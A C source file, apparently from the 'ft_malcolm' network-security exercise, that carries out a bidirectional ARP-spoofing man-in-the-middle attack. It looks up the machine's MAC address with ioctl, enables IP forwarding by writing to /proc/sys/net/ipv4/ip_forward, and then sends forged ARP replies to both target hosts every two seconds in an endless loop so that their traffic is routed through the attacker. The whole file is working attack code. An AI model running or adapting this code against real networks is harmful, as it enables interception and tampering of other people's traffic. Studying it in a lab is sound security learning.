#include "../include/ft_malcolm.h"

#include <sys/ioctl.h>


/**
 * @brief Retrieve the MAC address of the specified network interface
 * @param interface Name of the network interface (e.g., "eth0")
 * @param mac Pointer to a buffer to store the MAC address (6 bytes)
 * @return int 0 on success, -1 on failure
 */
static int get_our_mac(const char* interface, uint8_t* mac) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    struct ifreq ifr;
    ft_strlcpy(ifr.ifr_name, interface, IFNAMSIZ);
    
    errno = 0;
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    ft_memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    char buff[32] = {};
    mac_addr_byte_to_str(mac, buff);
    INFO("Our MAC: %s\n", buff);
    close(sock);
    return 0;
}


/**
 * @brief Enable IP forwarding using /proc/sys/net/ipv4/ip_forward file manipulation
 */
static s8 enable_ip_forwarding() {
    int fd = open("/proc/sys/net/ipv4/ip_forward", O_WRONLY | O_TRUNC);
    
    errno = 0;
    if (fd == -1) {
        perror("open");
        return (FALSE);
    }

    errno = 0;
    if (write(fd, "1", 1) != 1) {
        perror("write");
        close(fd);
        return (FALSE);
    }

    close(fd);
    INFO("IP forwarding enabled\n");
    return (TRUE);
}

/**
 * @brief Perform a bidirectional MITM attack by continuously sending spoofed ARP replies
 * @param c Pointer to the MalcolmCtx structure containing context information
 */
void mitm_attack(MalcolmCtx *c) {

    if (!enable_ip_forwarding()) {
        ERR("Failed to enable IP forwarding\n");
        exit(EXIT_FAILURE);
    }

    u8 our_mac[32] = {};
    get_our_mac("eth0", our_mac);

    s32 count = 0;
    while (1) {
        build_packet(c->arp_reply_packet, c->src_ip, our_mac, c->target_ip, c->target_mac);
        send_raw_packet(c);
        build_packet(c->arp_reply_packet, c->target_ip, our_mac, c->src_ip, c->src_mac);
        send_raw_packet(c);
        count++;
        INFO("Poisoning... (sent %d packets)\n", count * 2);
        sleep(2);
    }

}